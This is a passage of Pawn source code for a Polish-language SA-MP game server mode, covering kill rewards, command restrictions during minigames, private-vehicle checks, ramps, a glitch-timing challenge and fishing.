					AddPlayerPenalty(killerid, P_JAIL, INVALID_PLAYER_ID, 100, "Car kill");
				}
				if(GetPlayerState(killerid) == PLAYER_STATE_DRIVER && reason == 50)
				{
					AddPlayerPenalty(killerid, P_JAIL, INVALID_PLAYER_ID, 90, "Heli kill");
				}
			}
		}
		if(pInfo[killerid][player_arena])
		{
			addPointEvent(killerid, pInfo[killerid][player_arena]);
			achievement(killerid, 24);
			
			SpawnPlayerToArena(playerid, pInfo[playerid][player_arena]);
			
			if((pInfo[playerid][player_gang] != pInfo[killerid][player_gang] && pInfo[killerid][player_gang] > 0 && pInfo[killerid][player_arena] == stats_arenagang)||pInfo[killerid][player_gangID]==2)
			{
				gInfo[pInfo[killerid][player_gang]][gangPoints]++;
			}	 
		} else {
			if(reason == 34) achievement(killerid, 29);
		}
		
	
		gInfo[pInfo[killerid][player_gang]][gangPoints]++;
		if(pInfo[playerid][player_bounty] > 0)
		{
			
			achievement(killerid, 2);
			SendClientMessageToAll(-1, ""chat" {008ae6}%s (%d){/b} otrzyma³(a){008ae6} %d {/b}punktów respektu za zabicie {008ae6}%s (%d). (/Hitman)", playerNick(killerid), killerid, pInfo[playerid][player_bounty], playerNick(playerid), playerid);
			
			GivePlayerScore(killerid, pInfo[playerid][player_bounty]);
			pInfo[playerid][player_bounty] = 0;
			
		}  
		if(GetPlayerWeapon(killerid) == gmData[server_gunday])
		{
			SendClientMessage(killerid, COLOR_ERROR, "» Zabi³eœ(aœ) gracza z broni dnia (/BronDnia)! dostajesz dodatkowe punkty respektu.");
			GivePlayerScore(killerid, 1+random(3));
			
			achievement(killerid, 26);
		}
		
		pInfo[killerid][player_kills]++;
		
		if(pInfo[playerid][player_vip] > gettime() || pInfo[playerid][player_vip] == -1)
			GivePlayerScore(killerid, 2);
		else 
			GivePlayerScore(killerid, 1);

		SendClientMessage(killerid, COLOR_ERROR, "» Zabi³eœ(aœ) gracza {FFFFFF}%s (%d){/b} z broni {FFFFFF}%s{/b}.", playerNick(playerid), playerid, GetWeaponNameEx(GetPlayerWeapon(killerid)));
		
		pInfo[playerid][player_deaths]++;
		GivePlayerScore(playerid, -1);
		
		
		
		SendClientMessage(playerid, COLOR_ERROR, "» Zosta³eœ(aœ) zabity(a) przez {FFFFFF}%s (%d){/b} z broni {FFFFFF}%s{/b}.", playerNick(killerid), killerid, GetWeaponNameEx(GetPlayerWeapon(killerid)));
		#if defined ADUIO_PLUGIN
		Audio_PlayEx(playerid, DEAD_SOUND);
		#endif
	}	
	return 1;
} 
public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	if(!success && !CheckGangCmd(playerid, cmdtext))
	{
		
		SendClientMessage(playerid, COLOR_ERROR, "» Nie odnaleziono komendy {b}\"%s\"{/b}. Lista komend pod {b}/Cmd", cmdtext);
		PlaySoundForPlayer(playerid, 1085);
		return 1;
	}
	return 1;
} 
public OnPlayerCommandReceived(playerid, cmdtext[])
{
	//SendClientMessageToAll(COLOR_ERROR, "  OnPlayerCommandReceived(%d, '%s');", playerid, cmdtext);
	if(!pInfo[playerid][player_logged] && pInfo[playerid][player_register])
	{
		SendClientMessage(playerid, COLOR_ERROR, " »(E) Aby móc pisaæ na chacie musisz siê zalogowaæ.");
		ShowPlayerDialogLogin(playerid, ""HEX_ERROR"Musisz siê zalogowaæ aby móc pisaæ na chacie!"HEX_SAMP"");
		
		PlaySoundForPlayer(playerid, 1085);
		
		return 0;
	}
	if(!strcmp(cmdtext, "/wypisz", true))
 	{
 		return 1;
 	}
	if(!strcmp(cmdtext, "/unmute", true))
 	{
 		return 1;
 	}
	if(!strcmp(cmdtext, "/unjail", true))
 	{
 		return 1;
 	}
	if(!strcmp(cmdtext, "/raport", true))
 	{
 		return 1;
 	}

	if(!strcmp(cmdtext, "/pm", true))
 	{
 		return 1;
 	}

	if(!strcmp(cmdtext, "/l", true))
 	{
 		return 1;
 	}
	if(qInfo[playerid][gra])
	{
	    if(strcmp(cmdtext, "/stexit", true))
        {
            SendClientMessage(playerid,COLOR_RED, "Jesteœ na /st aby opuœciæ wpisz /stexit");
            return 0;
        }
	}
	
	if(pRob[playerid][playing] && Rob[Active])
	{
	    if(pInfo[playerid][player_admin] > 1)return 1;
		if(!strcmp("/hackuj", cmdtext) || !strcmp("/laduj", cmdtext) || !strcmp("/zapisz", cmdtext) || !strcmp("/hacker", cmdtext) || !strcmp("/muscle", cmdtext) || !strcmp("/soldier", cmdtext) || !strcmp("/ulecz", cmdtext) || !strcmp("/przerwijnapad", cmdtext) || !strcmp("/report", cmdtext) || !strcmp("/raport", cmdtext) )return 1;
        else {
            SendClientMessage(playerid,COLOR_RED, "Nie mo¿esz u¿ywaæ tej komendy podczas napadu.");
            return 0;
        }
	}

	if(Iter_Contains(w_g_players, playerid) && script_wg[statees])
	{
		if(strcmp(cmdtext, "/wgexit", true))
        {
            SendClientMessage(playerid,COLOR_RED, "Jesteœ na /wg aby opuœciæ wpisz /wgexit");
            return 0;
        }
	}
	
	if(Iter_Contains(c_h_players, playerid) && script_ch[statees])
	{
		if(strcmp(cmdtext, "/chexit", true))
        {
            SendClientMessage(playerid,COLOR_RED, "Jesteœ na /ch aby opuœciæ wpisz /chexit");
            return 0;
        }
	}
	
	if(Iter_Contains(w_s_players, playerid) && script_ws[statees])
	{
		if(strcmp(cmdtext, "/wsexit", true))
        {
            SendClientMessage(playerid,COLOR_RED, "Jesteœ na /ws aby opuœciæ wpisz /wsexit");
            return 0;
        }
	}

	if(Iter_Contains(d_d_players, playerid) && script_dd[statees])
	{
		if(strcmp(cmdtext, "/ddexit", true))
        {
            SendClientMessage(playerid,COLOR_RED, "Jesteœ na /dd aby opuœciæ wpisz /ddexit");
            return 0;
        }
	}
	
	if(Iter_Contains(o_s_players, playerid) && script_os[statees])
	{
		if(strcmp(cmdtext, "/osexit", true))
        {
            SendClientMessage(playerid,COLOR_RED, "Jesteœ na /os aby opuœciæ wpisz /osexit");
            return 0;
        }
	}

	if(Iter_Contains(h_y_players, playerid) && script_hy[statees])
	{
		if(strcmp(cmdtext, "/hyexit", true))
        {
            SendClientMessage(playerid,COLOR_RED, "Jesteœ na /hy aby opuœciæ wpisz /hyexit");
            return 0;
        }
	}

	if(Iter_Contains(d_f_players, playerid) && script_DF[statees])
	{
		if(strcmp(cmdtext, "/dfexit", true))
        {
            SendClientMessage(playerid,COLOR_RED, "Jesteœ na /df aby opuœciæ wpisz /dfexit");
            return 0;
        }
	}

	if(Iter_Contains(z_b_players, playerid) && script_zb[statees])
	{
		if(strcmp(cmdtext, "/zbexit", true))
        {
            SendClientMessage(playerid,COLOR_RED, "Jesteœ na /zb aby opuœciæ wpisz /zbexit");
            return 0;
        }
	}

	if(Iter_Contains(t_r_players, playerid) && script_tr[statees])
	{
		if(strcmp(cmdtext, "/trexit", true))
        {
            SendClientMessage(playerid,COLOR_RED, "Jesteœ na /tr aby opuœciæ wpisz /trexit");
            return 0;
        }
	}
	if(pInfo[playerid][player_cmdspam] > 1 && pInfo[playerid][player_admin] < 4)
	{
		SendClientMessage(playerid, COLOR_ERROR,""chat" Nie spamuj komendami! mo¿liwoœæ u¿ywania zosta³a chwilowo zablokowana.");
        PlaySoundForPlayer(playerid,1085);
		
		pInfo[playerid][player_chatspam]++;
		return 0;
	}
	if((pInfo[playerid][player_cmdspam] += 2, pInfo[playerid][player_cmdspam]) > 3)
	{
		pInfo[playerid][player_chatspam] += 2;
	}
	 
	if(Allow_Comment(playerid, cmdtext) || AllowAnim(playerid, cmdtext)) 
		return systemprintf("commands", true, "(%d) %s -> %s", playerid, playerNick(playerid), cmdtext);
	
	
	
	if(pInfo[playerid][player_inlabirynt])
	{
		InfoBox(playerid, "Wpisz /labiryntexit (/lbexit) aby opuœciæ labirynt.");
		return 0;
	}
	if(pInfo[playerid][player_ishouse])
	{
		SendClientMessage(playerid, COLOR_ERROR, "» U¿yj /dompanel by zarz¹dzaæ domem lub /wyjdz aby opuœciæ dom.");
		return 0;
	}
	if(pInfo[playerid][player_ishouse])
	{
		SendClientMessage(playerid, COLOR_ERROR, "» U¿yj /wyjdz aby opuœciæ dom.");
		return 0;
	}
	if(pInfo[playerid][player_glitchTest] == 1)
	{
		SendClientMessage(playerid, COLOR_ERROR, "» Na arenie /glitch nie mo¿esz u¿ywaæ komend wyj¹tek {b}/rsp, /glitchexit{/b}.");
		return 0;
	}
	if(pInfo[playerid][player_glitchTest] == 1)
	{
		SendClientMessage(playerid, COLOR_ERROR, "» Aby przerwac misje w skupie wpisz {b}/skupcancel{/b}.");
		return 0;
	}
	if(pInfo[playerid][player_arena])
	{
		SendClientMessage(playerid, COLOR_ERROR, "» U¿yj /Aexit aby opuœciæ arenê.");
		return 0;
	}
	if(is_event(playerid) && pInfo[playerid][player_admin] < 2)
	{
		SendClientMessage(playerid, COLOR_ERROR, "» U¿yj /Wypisz aby wypisaæ siê z eventu.");
		return 0;
	}
	if(pInfo[playerid][player_duel])
	{
		SendClientMessage(playerid, COLOR_ERROR, "» U¿yj /Dexit aby zrezygnowaæ z solo.");
		return 0;
	}
	if(pInfo[playerid][player_gangWarTeam] != 0 && player_gangInfo(playerid, gangWojnaTrwa) == true && pInfo[playerid][player_admin] < 3)
	{
		SendClientMessage(playerid, COLOR_ERROR, "» Aktualnie uczestniczysz w wojnie gangów. Nie mo¿esz u¿ywaæ komend!");
		return 0;
	}
	if(pInfo[playerid][player_jail] > 0 && pInfo[playerid][player_admin] < 3)
	{
		if(!strfind(cmdtext, "/toadmin", true)) return 1;
		
		SendClientMessage(playerid, COLOR_ERROR, "» Nie mo¿na u¿ywaæ komend w paczce! Wyj¹tek: /ToAdmin. Wyjœcie za: %ds", pInfo[playerid][player_jail]);
		return 0;
	}
	if(pInfo[playerid][player_blockcmd] > 0 && pInfo[playerid][player_admin] < 3)
	{
		SendClientMessage(playerid, COLOR_ERROR, "» Mo¿liwoœæ u¿ywania komend zostanie odblokowana za %ds", pInfo[playerid][player_blockcmd]);
		return 0;
	}
	if(pInfo[playerid][player_tirminssion])
	{
		InfoBox(playerid, "Aktualnie wykonujesz misjê przewozu spedycyjnego. \nAby Przerwaæ misjê wpisz "HEX_ERROR"/tirexit"HEX_SAMP".");
		return 0;
	}

	systemprintf("commands", true, "(%d) %s -> %s", playerid, playerNick(playerid), cmdtext);
	foreach(new adminid : VievEye)
	{
		if(pInfo[playerid][player_admin] <= pInfo[adminid][player_admin]) {
			SendClientMessage(adminid, 0xFFCC10FF, "(Eye) %s (%d): %s", playerNick(playerid), playerid, cmdtext);
		}
	}
	
	#if defined Plugin_4Fun
	
	new i = Plugin_GetIntData(MAP_TELEPORTS, cmdtext);
	if(i)
	{
		if (!strcmp (tInfo[i][telName], cmdtext, true))
		{
			if(pInfo[playerid][player_last_damage] > gettime() && pInfo[playerid][gavedmg] == true && pInfo[playerid][player_admin] < 2)
			{
				SendClientMessage(playerid,COLOR_ERROR, "Niestety nie mo¿esz tego zrobiæ!\nPrawdobodobnie uciekasz z walki.\n\nMusisz odczekaæ 5 sekund od zadanych obra¿eñ");
				return 0;
			}
			
			if(tInfo[i][telGang] >= 1 && pInfo[playerid][player_gang] != GetGangFromUid(tInfo[i][telGang]) )
			{
				new g = GetGangFromUid(tInfo[i][telGang]);
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Teleport tylko dla cz³onków gangu %s (%s).", gInfo[g][gangNazwa], gInfo[g][gangTag]);
				return 0;
			}
			//SendClientMessage(playerid, COLOR_ERROR, "[plugin test]");
			SetPlayerTeleport(playerid, i);
			return 0;
		}
	}
	new veh = Plugin_GetIntData(MAP_VEHICLES, cmdtext);
	#else 
	
 
	for(new i; i < loadedTeleports; i++)
	{
		if (!tInfo[i][telLoad]) continue;
		if (!tInfo[i][telName][0]) continue;
		
		if (!strcmp (tInfo[i][telName], cmdtext, true))
		{
			if(pInfo[playerid][player_last_damage] > gettime() && pInfo[playerid][gavedmg] == true && pInfo[playerid][player_admin] < 2)
			{
				InfoBox(playerid, "Niestety nie mo¿esz tego zrobiæ!\nPrawdobodobnie uciekasz z walki.\n\nMusisz odczekaæ 5 sekund od zadanych obra¿eñ");
				return 0;
			}
 
			if(tInfo[i][telGang] >= 1 && pInfo[playerid][player_gang] != GetGangFromUid(tInfo[i][telGang]) )
			{
				new g = GetGangFromUid(tInfo[i][telGang]);
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Teleport tylko dla cz³onków gangu %s (%s).", gInfo[g][gangNazwa], gInfo[g][gangTag]);
				return 0;
			}
			SetPlayerTeleport(playerid, i);
			return 0;
		}
	}
	new veh = GetVehicleIDStrcmp(cmdtext);
	#endif 
	if(veh > 0)
	{
		if(pInfo[playerid][player_last_damage] > gettime() && pInfo[playerid][gavedmg] == true && pInfo[playerid][player_admin] < 2)
		{
			InfoBox(playerid, "Niestety nie mo¿esz tego zrobiæ!\nPrawdobodobnie uciekasz z walki.\n\nMusisz odczekaæ 5 sekund od zadanych obra¿eñ");
			return 0;
		}//ketlar121
			
		//	52444996 - c2381400@trbvm.com
		new cv = CreatePlayerVehicle(playerid, veh);
		PutPlayerInVehicle(playerid, cv, 0);
		
		SendClientMessage(playerid, COLOR_BROWN_3, ""chat" Stworzy³eœ pojazd "HEX_ROSY_BROWN_2" '%s'.", VehicleNames[veh-400]);
		if(GetPlayerMoney(playerid) < 5000) GivePlayerMoney(playerid, -5000);
		
		return 0;
	}
	return 1;
}


public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(IsPlayerNPC(playerid)) return 1;
	if(pInfo[playerid][player_loggaingcrash][0] >= gettime())
	{
		if(pInfo[playerid][player_loggaingcrash][1]++ >= 7) 
		{
			SendAdminsMessage(COLOR_RED,  "[ANTI-CRASH] Server was kick'et %s (%d) reason: loggaing crashed", playerNick(playerid), playerid);
			Kick_(playerid);
		}
		pInfo[playerid][player_loggaingcrash][0] = gettime() + 1;
		return 0;
	}
	else 
	{
		pInfo[playerid][player_loggaingcrash][0] = gettime() + 1;
		pInfo[playerid][player_loggaingcrash][1] = 0;
	}
	SyncCamera(playerid);
	
	if(newstate != oldstate || newstate == oldstate)
	{
		switch(newstate)
		{
			case PLAYER_STATE_DRIVER:
			{
				pInfo[playerid][player_usevehicle] = GetPlayerVehicleID(playerid);
				new vehicleid = pInfo[playerid][player_usevehicle];
				PlayerTextDrawSetPreviewModel(playerid, pInfo[playerid][player_TextureVeh], GetVehicleModel(vehicleid));

				foreach(new fi : Player)
				{
					if(pInfo[fi][player_car_have] == false) continue;
					
					if(pInfo[fi][player_car_have])
					{
						if(gmData[player_vehicleid][fi] == vehicleid)
						{
							if(fi != playerid)
							{
								new Float:pos0[3];
								GetPlayerPos(playerid, pos0[0], pos0[1], pos0[2]); 
								SetPlayerPos(playerid, pos0[0] + 2, pos0[1] + 2, pos0[2] + 2); 
								
								GivePlayerHealth(playerid, -10.0);
								
								achievement(playerid, 3);
								SendClientMessage(playerid, COLOR_ERROR, ""chat" Ten pojazd jest prywatny! nie mo¿esz do niego wsiadaæ tracisz 10prc ¿ycia", pInfo[fi][player_name]);
								return 1;
							}
							else if(pInfo[playerid][player_car_date] < gettime()) 
							{
								SendClientMessage(playerid, COLOR_INFO, ""chat" Twój Prywatny pojazd straci³ wa¿noœæ. Aby go odzyskaæ przed³ó¿ go w /Pojazd");
								new Float:pos0[3];
								GetPlayerPos(playerid, pos0[0], pos0[1], pos0[2]); 
								SetPlayerPos(playerid, pos0[0] + 2, pos0[1] + 2, pos0[2] + 2); 
								return 1;
							}
						}
					}
				}
				
				if(Rob[Active])
				{
				    if(vehicleid == Rob[MainCar])
				    {
				        if(pRob[playerid][playing])
				        {
				        	new Float:pos0[3];
							GetPlayerPos(playerid, pos0[0], pos0[1], pos0[2]);
							SetPlayerPos(playerid, pos0[0] + 2, pos0[1] + 2, pos0[2] + 2);
							SendClientMessage(playerid, COLOR_INFO, ""chat" Nie mo¿esz ukraœæ tego pojazdu!");
				        }
				    }
				}
				
				if(Vehicle_IsWp(vehicleid))
				{
				    for(new x; x < WHighestID; x++) {
				        if(Wp[x][vehicle] == vehicleid) {
						    if(Wp[x][owner] != pInfo[playerid][player_id])
						    {
				        		new Float:pos0[3];
								GetPlayerPos(playerid, pos0[0], pos0[1], pos0[2]);
								SetPlayerPos(playerid, pos0[0] + 2, pos0[1] + 2, pos0[2] + 2);

								GivePlayerHealth(playerid, -10.0);

								achievement(playerid, 3);
								SendClientMessage(playerid, COLOR_ERROR, ""chat" Ten pojazd jest prywatny! nie mo¿esz do niego wsiadaæ tracisz 10prc ¿ycia");
								return 1;
						    }
					    }
				    }
				}
				
				if(vehicleid == ten_woz && ten_woz != -1 )//&& pInfo[playerid][player_admin] == 0)
				{	
					new engine, lights, alarm, doors, bonnet, boot, objective;
					GetVehicleParamsEx(ten_woz, engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(ten_woz, 1, lights, alarm, doors, bonnet, boot, 0);
					
					ten_woz = -1;
					new win[2];
					win[0] = (random(10)+5);
					win[1] = (random(5000)+5000);
					GivePlayerMoney(playerid, win[1]);
					GivePlayerScore(playerid, win[0]);
					SendClientMessageToAll(COLOR_GREEN, "» %s (%d) znalaz³ wóz i otrzyma³ {b}%d{/b} respektu", playerNick(playerid), playerid, win[0]); //wygenerowany
		 
					addPointEvent(playerid, stats_zauta);
					achievement(playerid, 19);
				}
				achievement(playerid, 6);
				
				Iter_Add(Drivers, playerid);  
				PlayerText_Licznik(playerid, true);
 				
				return 1;
			}
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{

			}
			default: 
			{

			} 
		}
	}
	 
	if(oldstate == PLAYER_STATE_DRIVER && newstate != PLAYER_STATE_DRIVER)
	{
		OnPlayerExitVehicle(playerid, pInfo[playerid][player_usevehicle]);
 		Iter_Remove(Drivers, playerid);
		PlayerText_Licznik(playerid, false); 
	}
	UpdateSpec(playerid);
	return 1;
}
Public:glitch_NextPart(playerid)
{
    pInfo[playerid][player_glitchCount][0] = 0; pInfo[playerid][player_glitchCount][1] = 0; pInfo[playerid][player_glitchCount][2] = 0; pInfo[playerid][player_glitchCount][3] = 0;
    ResetPlayerWeapons(playerid);
	GivePlayerWeapon(playerid, 24, 7);
}
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{	
	#define KEY_PRESSED(%0) (((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
	#define KEY_RELEASED(%0) (((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))

/*	if(newkeys == 160 && GetPlayerVehicleID(playerid) == 0)
	{
	    switch(GetWeaponSlot(GetPlayerWeapon(playerid)))
	    {
	        case 0, 1, 8, 11:
	        {
	            cmd_rsp(playerid,"");
	            return 1;
	        }
	    }
	}*/
	if(gmData[antiMacro] == true && CheckPlayerSprintMacro(playerid, newkeys, oldkeys) == true)
	    return 1;
	
	if(pInfo[playerid][player_ramp_pers] != -1 && IsPlayerSpawned(playerid))
	{		
		if(!pInfo[playerid][player_ramp_pers]) pInfo[playerid][player_ramp_pers] = 1655;
		
		if (IsPlayerInAnyVehicle(playerid) && GetPlayerVehicleSeat(playerid) == 0 && (newkeys == KEY_ACTION || newkeys == 9))
		{
			new Arabam = pInfo[playerid][player_usevehicle];
			switch(GetVehicleModel(Arabam))
			{
				case 592, 577, 511, 512, 593, 520, 553, 476, 519, 460, 513, 487, 488, 548, 425, 417, 497, 563, 447, 469:
					return 1;
			}
			
			if(pInfo[playerid][player_rampcreated] == true)
			{
				pInfo[playerid][player_ramp_timer] = 0;
				DestroyPlayerObject(playerid, pInfo[playerid][player_ramp]);
			}
			new Float:pX, Float:pY, Float:pZ, Float:vA;
			GetVehiclePos(Arabam, pX, pY, pZ);
			GetVehicleZAngle(Arabam, vA);
			pInfo[playerid][player_ramp] = CreatePlayerObject(playerid, pInfo[playerid][player_ramp_pers], pX + (25.0 * floatsin(-vA, degrees)), pY + (25.0 * floatcos(-vA, degrees)), pZ-0.5, 0, 0, vA);
			pInfo[playerid][player_rampcreated] = true;
			pInfo[playerid][player_ramp_timer] = 4;
		}
	}
	if (newkeys & KEY_FIRE && IsPlayerVehicleTurbo(playerid) && GetPlayerVehicleSeat(playerid) == 0 && GetPVarInt(playerid, "NRG_TURBO") == 1)
	{
		CreatePlayerTurbo(playerid, 0);
		return 1;
	}
	if(newkeys & KEY_FIRE && GetPlayerWeapon(playerid) == 9 && IsPlayerInArea(playerid,1004.25, 910.701, -283.491, -386.749))
	{
		for(new x; x <= tHighestID;x++)
		{
		    if(Tree[x][tree_owner] == pInfo[playerid][player_id] && Tree[x][percentage] >= 100)
		    {
		        if(IsPlayerInRangeOfPoint(playerid,1.5,Tree[x][tree_pos][0],Tree[x][tree_pos][1],Tree[x][tree_pos][2]))
		        {
					LieDownTree(x,playerid);
				}
		    }
		}
	}
	/*if(newkeys & KEY_FIRE && oldkeys & KEY_CROUCH && IsCbugWeapon(playerid))
	{
		if(++pInfo[playerid][player_cbugWarn] > 10)
		{
			
			if(!pInfo[playerid][player_jail])  
			pInfo[playerid][player_cbugWarn] = 0;
		}
		else
		{
			format(string2, sizeof(string2), "[Anty Cheat]: Prawdopodobny {b}Auto C-Bug{/b} u gracza %s (%d). (weapon: %d, warn: %d/10 )!", playerNick(playerid), playerid, GetPlayerWeapon(playerid), pInfo[playerid][player_cbugWarn]);
			SendAdminsMessage(COLOR_RED, string2);
		}
	}*/
	
	if(pInfo[playerid][player_arena] == stats_onede || pInfo[playerid][player_arena] == stats_onede2 || pInfo[playerid][player_duel] || ( pInfo[playerid][player_sparmember] && player_gangInfo(playerid, gangWojnaTrwa) == true ))
	{
 
	    if(KEY_PRESSED(KEY_CROUCH) && GetTickCount()-pInfo[playerid][player_lastKeyFire]<600) 
		{
			
			pInfo[playerid][player_autocBug] = 0;
			if(pInfo[playerid][player_arena] == stats_onede2)
			{
				if( GetPlayerWeapon(playerid)==24 )
				{
					SetPlayerVelocity(playerid, 0.01,-0.01,0.1);
					SetPlayerArmedWeapon(playerid,0);
					
					SendClientMessage(playerid, COLOR_CYAN_2, " Na tej arenie "HEX_TAN_1"GL/TGL{/b} jest zabronione.");
				}
			}
			return 0;
		}
	}
	if(pInfo[playerid][player_glitchTest] == 1)
	{
		if(GetPlayerWeapon(playerid) == 24)
		{
			if(GetPlayerAmmo(playerid) > 7) glitch_NextPart(playerid);
		    if(GetPlayerAmmo(playerid) == 7 && KEY_PRESSED(KEY_FIRE))
			{
			    pInfo[playerid][player_glitchCount][0] = GetTickCount();
                pInfo[playerid][player_glitchDisply] = true;
			}
			else if(KEY_RELEASED(KEY_FIRE))
			{
			    if(GetPlayerAmmo(playerid) == 0)
			    {
					new bool:automaticSave = false;
					pInfo[playerid][player_glitchCount][1] = GetTickCount();
					pInfo[playerid][player_glitchCount][2] = pInfo[playerid][player_glitchCount][1] - pInfo[playerid][player_glitchCount][0];
					pInfo[playerid][player_glitchCount][3] = pInfo[playerid][player_glitchCount][2] / 1000;
					pInfo[playerid][player_glitchDisply] = false;
					
					if(pInfo[playerid][player_glitchCount][3] < 0.5)
					{	
						pInfo[playerid][player_glitchDisply] = false;
						GameTextForPlayer(playerid, "Wystapil blad glitch nie zaliczony!~n~Zbyt szybko!", 2000, 4);
						SetTimerEx("glitch_NextPart", 2000, 0, "i", playerid);
						return 1;
					}
					GameTextForPlayer(playerid, splitf("~r~Glitch~w~:~g~%0.4f~y~s", pInfo[playerid][player_glitchCount][3]), 2000, 4);
					
					foreach(new pid : Player)
					{
						if(pInfo[pid][player_glitchTest] != 1) continue;
						
						SendClientMessage(pid, COLOR_INFO2, ""chat" %s (%d) zrobi³ Glitcha w {b}%0.4fs{/b}.", playerNick(playerid), playerid, pInfo[playerid][player_glitchCount][3]);
					}
					if(gmData[topGlitch] > pInfo[playerid][player_glitchCount][3]){
						
						automaticSave = true;
						gmData[topGlitch] = pInfo[playerid][player_glitchCount][3];
						this->config::savesql_float("stats/topGlitch", gmData[topGlitch]);
						
						SendClientMessageToAll(COLOR_INFO3, ""chat" Nowy rekord Glitch'a {b}%0.4fs{/b} ustanowiony przez %s (%d).", pInfo[playerid][player_glitchCount][3], playerNick(playerid), playerid);
					} 
					if(pInfo[playerid][player_glitchCount][3] < 1.3) automaticSave = true;
					
					if(!automaticSave) Dialog_Show(playerid, SaveGlitch, DIALOG_STYLE_MSGBOX, "• Glitch Save •", splitf("Twój wynik to {dd0000}%0.4fs"HEX_SAMP" czy chcesz go zapisaæ do bazy danych?\nPierwsze 3 zapisy s¹ darmowe ka¿dy kolejny kosztuje 200pkt respektu.\nZapisa³eœ ju¿ {FF0000}%d "HEX_SAMP" wynik(ów).\n\nWyniki poni¿ej 1.3s sa zapisywane automatycznie i darmowo!", pInfo[playerid][player_glitchCount][3], pInfo[playerid][player_glitchSaved]), "Zapisz", "Nie zapisuj");
					else
					{
						 
						InsertGlitchInfo(playerid), SetTimerEx("glitch_NextPart", 2000, 0, "i", playerid);
						pInfo[playerid][player_glitchCount][0] = 0; pInfo[playerid][player_glitchCount][1] = 0; pInfo[playerid][player_glitchCount][2] = 0; pInfo[playerid][player_glitchCount][3] = 0;
				
					}
					return 1;
				}
			}
		}
		else if(pInfo[playerid][player_glitchDisply] == true)
		{
			pInfo[playerid][player_glitchDisply] = false;
			GameTextForPlayer(playerid, "Wystapil blad glitch nie zaliczony!", 2000, 4);
			SetTimerEx("glitch_NextPart", 2000, 0, "i", playerid);
		}
	}
	if(KEY_PRESSED(KEY_FIRE))
    {
		pInfo[playerid][player_lastKeyFire]=GetTickCount();
	}
	if(pInfo[playerid][player_state] == PLAYER_STATE_SPECTATING && pInfo[playerid][player_admin] && pInfo[playerid][player_spec] != -1)
	{
		if((newkeys & 8))
		{
			StartSpec(playerid, pInfo[playerid][player_spec], true, 0);
		}
		else if((newkeys & 32))
		{
			StartSpec(playerid, pInfo[playerid][player_spec], true, 1);
		}
		return 1;
	}
	if (IsPlayerInAnyVehicle(playerid) ) 
	{
	    if (GetVehicleModel(pInfo[playerid][player_usevehicle]) == 525)
		{
			if ((newkeys==KEY_ACTION))
			{
				SendClientMessage(playerid, COLOR_RED, ""chat" Próbujesz podczepiæ pojazd");
				new Float:pX, Float:pY, Float:pZ;
				GetPlayerPos(playerid, pX, pY, pZ);
				new Float:vX, Float:vY, Float:vZ;
				new Found=0;
				new vid=0;
				while((vid<MAX_VEHICLES)&&(!Found))
				{
					vid++;
					GetVehiclePos(vid, vX, vY, vZ);
					if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0)&&(floatabs(pZ-vZ)<7.0)&&(vid!=pInfo[playerid][player_usevehicle]))
					{
						Found=1;
						if (IsTrailerAttachedToVehicle(pInfo[playerid][player_usevehicle]))
						{
							DetachTrailerFromVehicle(pInfo[playerid][player_usevehicle]);
						}
						AttachTrailerToVehicle(vid, pInfo[playerid][player_usevehicle]);
						SendClientMessage(playerid, COLOR_RED, "» Pojazd podczepiony");
						break;
					}
				}
				if(!Found)
				{
					SendClientMessage(playerid, COLOR_RED, "» Nie ma w pobli¿u ¿adnych samochodów.");
				}
			}
		}
	}
	if(newkeys == KEY_SUBMISSION)
	{	 
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerVehicleSeat(playerid) == 0)
		{
			if(Iter_Contains(d_d_players, playerid))
			{
		
				if(script_dd[statees] == true)
				{
					SendClientMessage(playerid, COLOR_ERROR, "» Na derbach {b}nie mo¿na{/b} naprawiaæ pojazdu...");
					return 1;
				}
			}	
			if(GetPVarInt(playerid, "NAPRAWA") > gettime())
				return SendClientMessage(playerid, COLOR_ERROR, "» Pojazd mo¿esz naprawiaæ za {b}%ds{/b}", GetPVarInt(playerid, "NAPRAWA") - gettime());
			
			SetPVarInt(playerid, "NAPRAWA", gettime() + 5);
			RepairVehicle(pInfo[playerid][player_usevehicle]);
			GameTextForPlayer(playerid, "~r~~h~Pojazd naprawiony!", 2000, 5);
			PlaySoundForPlayer(playerid, 1133);
		}
		return 1;
	}
	
	if(newkeys == 1 || newkeys == 9 || newkeys == 33 && oldkeys != 1 || oldkeys != 9 || oldkeys != 33)
	{
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerVehicleSeat(playerid) == 0)
		{
			new CarId = pInfo[playerid][player_usevehicle];
		 
		//	switch(GetVehicleModel(CarId)) //ALELUJA
		//	{
			//	case 446, 432, 448, 452, 424, 453, 454, 461, 462, 463, 468, 471, 430, 472, 449, 473, 481, 484, 493, 495, 509, 510, 521, 538, 522, 523, 532, 537, 570, 581, 586, 590, 569, 595, 604, 611: return 0;
		//	}
			AddVehicleComponent(CarId, 1010);
		}
	}
	if((newkeys & KEY_SECONDARY_ATTACK)&&!(oldkeys & KEY_SECONDARY_ATTACK) && (!pInfo[playerid][player_fishing]))
	{
		if(IsPlayerInFishingPos(playerid))
		{
			TogglePlayerControllable(playerid, 0);
			pInfo[playerid][player_fishing] = true;
			SetPlayerAttachedObject(playerid, 0, 18632, 6, 0.079376, 0.037070, 0.007706, 181.482910, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
		}
	}
	else if((newkeys & KEY_SECONDARY_ATTACK) && !(oldkeys & KEY_SECONDARY_ATTACK) && (pInfo[playerid][player_fishing]))
	{
		pInfo[playerid][player_fishing] = false;
		TogglePlayerControllable(playerid, 1);
		new zz=0;
		while(zz!=MAX_PLAYER_ATTACHED_OBJECTS)
		{
			if(IsPlayerAttachedObjectSlotUsed(playerid, zz))
			{
				RemovePlayerAttachedObject(playerid, zz);
			}
			zz++;
		}
		ClearAnimations(playerid);
	}
	else if((newkeys & KEY_SPRINT) && !(oldkeys & KEY_SPRINT) && (pInfo[playerid][player_fishing]))
	{

